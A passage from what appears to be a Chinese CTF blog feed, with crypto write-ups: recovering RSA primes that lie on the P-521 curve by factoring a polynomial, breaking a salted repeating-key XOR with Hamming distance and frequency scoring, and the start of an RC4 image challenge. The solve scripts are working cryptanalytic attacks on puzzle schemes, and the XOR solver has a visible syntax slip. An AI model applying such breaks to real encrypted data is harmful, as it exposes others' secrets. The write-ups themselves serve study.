class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> P521 <span class="keyword">as</span> Curve</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_rsa_primes</span><span class="params">(G)</span>:</span></span><br><span class="line">urand = bytes_to_long(urandom(<span class="number">521</span>//<span class="number">8</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s = getrandbits(<span class="number">521</span>) ^ urand</span><br><span class="line"></span><br><span class="line">Q = s*G</span><br><span class="line"><span class="keyword">if</span> isPrime(Q.x) <span class="keyword">and</span> isPrime(Q.y):</span><br><span class="line">print(<span class="string">"ECC Private key:"</span>, hex(s))</span><br><span class="line">print(<span class="string">"RSA primes:"</span>, hex(Q.x), hex(Q.y))</span><br><span class="line">print(<span class="string">"Modulo:"</span>, hex(Q.x * Q.y))</span><br><span class="line"><span class="keyword">return</span> (Q.x, Q.y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = int.from_bytes(input(), byteorder=<span class="string">"big"</span>)</span><br><span class="line"></span><br><span class="line">ecc_p = Curve.p</span><br><span class="line">a = Curve.a</span><br><span class="line">b = Curve.b</span><br><span class="line"></span><br><span class="line">Gx = Curve.gx</span><br><span class="line">Gy = Curve.gy</span><br><span class="line">G = Point(Gx, Gy, curve=Curve)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p, q = gen_rsa_primes(G)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_out = open(<span class="string">"downloads/ecc-rsa.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">"ECC Curve Prime: "</span> + hex(ecc_p) + <span class="string">"\n"</span>)</span><br><span class="line">file_out.write(<span class="string">"Curve a: "</span> + hex(a) + <span class="string">"\n"</span>)</span><br><span class="line">file_out.write(<span class="string">"Curve b: "</span> + hex(b) + <span class="string">"\n"</span>)</span><br><span class="line">file_out.write(<span class="string">"Gx: "</span> + hex(Gx) + <span class="string">"\n"</span>)</span><br><span class="line">file_out.write(<span class="string">"Gy: "</span> + hex(Gy) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">file_out.write(<span class="string">"e: "</span> + hex(e) + <span class="string">"\n"</span>)</span><br><span class="line">file_out.write(<span class="string">"p * q: "</span> + hex(n) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">c = pow(flag, e, n)</span><br><span class="line">file_out.write(<span class="string">"ciphertext: "</span> + hex(c) + <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>RSA中（p,q）是以G为基点，P,a,b为参量的椭圆曲线上一点</p><p>已知Q，G，在素数域中推断出私钥s十分困难</p><p>通过椭圆曲线方程构造只有一个未知量的基于有限域的多项式</p><p>对多项式进行分解，度为1且与n有公因数即可分解p,q</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h5 id="椭圆曲线方程"><a href="#椭圆曲线方程" class="headerlink" title="椭圆曲线方程"></a>椭圆曲线方程</h5><p>定义在Fp(p是大于3的素数上的椭圆曲线方程为</p><p>y^2^ =x^3^+ax+b   a,b∈Fp</p><h5 id="构造多项式"><a href="#构造多项式" class="headerlink" title="构造多项式"></a>构造多项式</h5><p>q^2^=p^3^+ap+b(mod P)</p><p>两边同乘p^2^</p><p>n^2^=p^5^+ap^3^+bp^2^(mod P)</p><p>则多项式 f ≡ p^5^+ap^3^+bp^2^-n^2^(mod P)</p><h5 id="分解多项式求p"><a href="#分解多项式求p" class="headerlink" title="分解多项式求p"></a>分解多项式求p</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;p&gt;&#x3D;PolynomialRing(GF(P))</span><br><span class="line">f&#x3D;p^5+a*p^3+b*p^2-n^2</span><br><span class="line">factor&#x3D;f.factor()</span><br><span class="line">for i in factor:</span><br><span class="line">    if i[0].degree()&#x3D;&#x3D;1:</span><br><span class="line">        p&#x3D;Integer(mod(-i[0][0],P))</span><br><span class="line">        if gcd(p,n)!&#x3D;1:</span><br><span class="line">            q&#x3D;n&#x2F;&#x2F;p</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>注意：①因为p求出来是负数，需要对P求模取正</p><p>②mod(-i[0][0],P)的数据类型与n(Integer类型)不同，这里踩了坑，gcd(mod(-i[0][0],P),n)一直等于一，应该进行Integer()类型转换</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D; 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">a&#x3D; -0x3</span><br><span class="line">b&#x3D; 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span><br><span class="line">x&#x3D; 0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span><br><span class="line">y&#x3D; 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span><br><span class="line">e&#x3D; 0x10001</span><br><span class="line">n&#x3D; 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span><br><span class="line">c&#x3D; 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span><br><span class="line">R.&lt;p&gt;&#x3D;PolynomialRing(GF(P))</span><br><span class="line">f&#x3D;p^5+a*p^3+b*p^2-n^2</span><br><span class="line">factor&#x3D;f.factor()</span><br><span class="line">for i in factor:</span><br><span class="line">    if i[0].degree()&#x3D;&#x3D;1:</span><br><span class="line">        p&#x3D;Integer(mod(-i[0][0],P))</span><br><span class="line">        if gcd(p,n)!&#x3D;1:</span><br><span class="line">            q&#x3D;n&#x2F;&#x2F;p</span><br><span class="line">            break</span><br><span class="line">d&#x3D;inverse_mod(e,(p-1)*(q-1))</span><br><span class="line">m&#x3D;pow(c,d,n)</span><br><span class="line">print(bytes.fromhex(hex(m)[2:]))</span><br></pre></td></tr></table></figure><p>椭圆曲线学习出处</p><blockquote><p><a href="https://www.cnblogs.com/Kalafinaian/p/7392505.html" target="_blank" rel="noopener">https://www.cnblogs.com/Kalafinaian/p/7392505.html</a></p><p><a href="https://www.freebuf.com/articles/database/155912.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/155912.html</a></p><p><a href="https://www.freebuf.com/articles/database/165851.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/165851.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ECC</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xorz[De1ctf]</title>
    <link href="/2020/07/10/xorz/"/>
    <url>/2020/07/10/xorz/</url>
    
    <content type="html"><![CDATA[<p>流密码与汉明距离</p><a id="more"></a><p>学习出处:<a href="https://www.anquanke.com/post/id/161171#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161171#h3-6</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line">output:</span><br><span class="line"><span class="number">49380</span>d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先去掉盐值，使mid为密钥流与明文异或结果</p><p>通过计算汉明距离求出密钥长度</p><p>再进行字频分析推测出密钥</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h3><blockquote><p>汉明距离其实是在二进制层面观测两个等长字符串的比特位差异。</p></blockquote><p>取等长二进制进行异或，最后对应为1的比特位个数即为汉明距离。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    xor_ = bin(int(a, <span class="number">16</span>) ^ int(b, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> xor_.count(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>汉明距离与猜测密钥长度</p><p>大小写英文字符两两的平均Hamming距离为2 ~ 3，而任意字符两两的平均Hamming距离为4。所以猜测到正确的密钥时，两段密文异或即对应的明文异或，这时两段的汉明距离应该趋于最小。取多段密文计算汉明距离再求平均，即可以推测出密钥长度。</p><h3 id="推断密钥"><a href="#推断密钥" class="headerlink" title="推断密钥"></a>推断密钥</h3><p>求出密钥长度为30后，进行字频分析</p><p>字频表如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">freq = &#123;&#125;</span><br><span class="line">freq[<span class="string">' '</span>] = <span class="number">700000000</span></span><br><span class="line">freq[<span class="string">'e'</span>] = <span class="number">390395169</span></span><br><span class="line">freq[<span class="string">'t'</span>] = <span class="number">282039486</span></span><br><span class="line">freq[<span class="string">'a'</span>] = <span class="number">248362256</span></span><br><span class="line">freq[<span class="string">'o'</span>] = <span class="number">235661502</span></span><br><span class="line">freq[<span class="string">'i'</span>] = <span class="number">214822972</span></span><br><span class="line">freq[<span class="string">'n'</span>] = <span class="number">214319386</span></span><br><span class="line">freq[<span class="string">'s'</span>] = <span class="number">196844692</span></span><br><span class="line">freq[<span class="string">'h'</span>] = <span class="number">193607737</span></span><br><span class="line">freq[<span class="string">'r'</span>] = <span class="number">184990759</span></span><br><span class="line">freq[<span class="string">'d'</span>] = <span class="number">134044565</span></span><br><span class="line">freq[<span class="string">'l'</span>] = <span class="number">125951672</span></span><br><span class="line">freq[<span class="string">'u'</span>] = <span class="number">88219598</span></span><br><span class="line">freq[<span class="string">'c'</span>] = <span class="number">79962026</span></span><br><span class="line">freq[<span class="string">'m'</span>] = <span class="number">79502870</span></span><br><span class="line">freq[<span class="string">'f'</span>] = <span class="number">72967175</span></span><br><span class="line">freq[<span class="string">'w'</span>] = <span class="number">69069021</span></span><br><span class="line">freq[<span class="string">'g'</span>] = <span class="number">61549736</span></span><br><span class="line">freq[<span class="string">'y'</span>] = <span class="number">59010696</span></span><br><span class="line">freq[<span class="string">'p'</span>] = <span class="number">55746578</span></span><br><span class="line">freq[<span class="string">'b'</span>] = <span class="number">47673928</span></span><br><span class="line">freq[<span class="string">'v'</span>] = <span class="number">30476191</span></span><br><span class="line">freq[<span class="string">'k'</span>] = <span class="number">22969448</span></span><br><span class="line">freq[<span class="string">'x'</span>] = <span class="number">5574077</span></span><br><span class="line">freq[<span class="string">'j'</span>] = <span class="number">4507165</span></span><br><span class="line">freq[<span class="string">'q'</span>] = <span class="number">3649838</span></span><br><span class="line">freq[<span class="string">'z'</span>] = <span class="number">2456495</span></span><br></pre></td></tr></table></figure><p>将每位密钥对应的所有密文分为一组</p><p>将一组密文与0~256异或解出对应的明文</p><p>计算这组明文的频率分数</p><p>分数最高的字符即是对应的密钥位</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">salt = <span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">si = cycle(salt)</span><br><span class="line">cipher = <span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span></span><br><span class="line">mid = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cipher), <span class="number">2</span>):</span><br><span class="line">    mid += hex(int(cipher[i:i + <span class="number">2</span>], <span class="number">16</span>) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    xor_ = bin(int(a, <span class="number">16</span>) ^ int(b, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> xor_.count(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_len</span><span class="params">()</span>:</span></span><br><span class="line">    ave = []</span><br><span class="line">    <span class="keyword">for</span> keysize <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">38</span>):</span><br><span class="line">        b = [</span><br><span class="line">            mid[:keysize * <span class="number">2</span>],</span><br><span class="line">            mid[keysize * <span class="number">2</span>:keysize * <span class="number">4</span>],</span><br><span class="line">            mid[keysize * <span class="number">4</span>:keysize * <span class="number">6</span>],</span><br><span class="line">            mid[keysize * <span class="number">6</span>:keysize * <span class="number">8</span>],</span><br><span class="line">            mid[keysize * <span class="number">8</span>:keysize * <span class="number">10</span>],</span><br><span class="line">            mid[keysize * <span class="number">10</span>:keysize * <span class="number">12</span>],</span><br><span class="line">        ]</span><br><span class="line">        print(b)</span><br><span class="line">        distance = [</span><br><span class="line">            hamming_distance(b[x], b[x + <span class="number">1</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> range(len(b) - <span class="number">1</span>)</span><br><span class="line">        ]</span><br><span class="line">        ave.append((sum(distance) / (keysize * <span class="number">5</span>), keysize))</span><br><span class="line">    <span class="keyword">return</span> sorted(ave)[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(s)</span>:</span></span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    freq[<span class="string">' '</span>] = <span class="number">700000000</span></span><br><span class="line">    freq[<span class="string">'e'</span>] = <span class="number">390395169</span></span><br><span class="line">    freq[<span class="string">'t'</span>] = <span class="number">282039486</span></span><br><span class="line">    freq[<span class="string">'a'</span>] = <span class="number">248362256</span></span><br><span class="line">    freq[<span class="string">'o'</span>] = <span class="number">235661502</span></span><br><span class="line">    freq[<span class="string">'i'</span>] = <span class="number">214822972</span></span><br><span class="line">    freq[<span class="string">'n'</span>] = <span class="number">214319386</span></span><br><span class="line">    freq[<span class="string">'s'</span>] = <span class="number">196844692</span></span><br><span class="line">    freq[<span class="string">'h'</span>] = <span class="number">193607737</span></span><br><span class="line">    freq[<span class="string">'r'</span>] = <span class="number">184990759</span></span><br><span class="line">    freq[<span class="string">'d'</span>] = <span class="number">134044565</span></span><br><span class="line">    freq[<span class="string">'l'</span>] = <span class="number">125951672</span></span><br><span class="line">    freq[<span class="string">'u'</span>] = <span class="number">88219598</span></span><br><span class="line">    freq[<span class="string">'c'</span>] = <span class="number">79962026</span></span><br><span class="line">    freq[<span class="string">'m'</span>] = <span class="number">79502870</span></span><br><span class="line">    freq[<span class="string">'f'</span>] = <span class="number">72967175</span></span><br><span class="line">    freq[<span class="string">'w'</span>] = <span class="number">69069021</span></span><br><span class="line">    freq[<span class="string">'g'</span>] = <span class="number">61549736</span></span><br><span class="line">    freq[<span class="string">'y'</span>] = <span class="number">59010696</span></span><br><span class="line">    freq[<span class="string">'p'</span>] = <span class="number">55746578</span></span><br><span class="line">    freq[<span class="string">'b'</span>] = <span class="number">47673928</span></span><br><span class="line">    freq[<span class="string">'v'</span>] = <span class="number">30476191</span></span><br><span class="line">    freq[<span class="string">'k'</span>] = <span class="number">22969448</span></span><br><span class="line">    freq[<span class="string">'x'</span>] = <span class="number">5574077</span></span><br><span class="line">    freq[<span class="string">'j'</span>] = <span class="number">4507165</span></span><br><span class="line">    freq[<span class="string">'q'</span>] = <span class="number">3649838</span></span><br><span class="line">    freq[<span class="string">'z'</span>] = <span class="number">2456495</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s.lower():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> freq:</span><br><span class="line">            score += freq[i]</span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_key</span><span class="params">(ci)</span>:</span></span><br><span class="line">    ci = bytes.fromhex(ci)</span><br><span class="line">    Score = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        xor = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> ci:</span><br><span class="line">            xor.append(chr(x ^ i))</span><br><span class="line">        s = <span class="string">''</span>.join(xor)</span><br><span class="line">        Score.append(score(s))</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">return</span> chr(Score.index(max(Score)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysize = key_len()</span><br><span class="line">c = [<span class="string">''</span>] * keysize</span><br><span class="line">key = []</span><br><span class="line">byte = bytes.fromhex(mid)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(byte)):</span><br><span class="line">    c[i % keysize] += hex(byte[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    key.append(guess_key(i))</span><br><span class="line">print(<span class="string">''</span>.join(key)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>crypto刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stream</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两道密码题[DASCTF五月赛]</title>
    <link href="/2020/06/22/DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/"/>
    <url>/2020/06/22/DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>RC4流密码结合图像处理，背包算法</p><a id="more"></a><h2 id="Encrypt-img"><a href="#Encrypt-img" class="headerlink" title="Encrypt_img"></a>Encrypt_img</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Key</span><br><span class="line"></span><br><span class="line">Plaintext1 = <span class="string">"RC4IsInteresting"</span></span><br><span class="line">Plaintext2 = <span class="string">"ThisIsAEasyGame"</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Key)</span>:</span></span><br><span class="line">        self.S = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.K = [ord(Key[i % len(Key)])*<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        self.I, self.J = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        self.KSA()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">KSA</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            j = (i+self.K[i]+self.S[i]) % <span class="number">256</span></span><br><span class="line">            self.S[i], self.S[j] = self.S[j], self.S[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.I = (self.I+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        self.J = (self.J+self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        self.S[self.J], self.S[self.I] = self.S[self.I], self.S[self.J]</span><br><span class="line">        tmp = (self.S[self.J] + self.S[self.I]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">return</span> self.S[tmp]</span><br><span class="line"></span><br><span 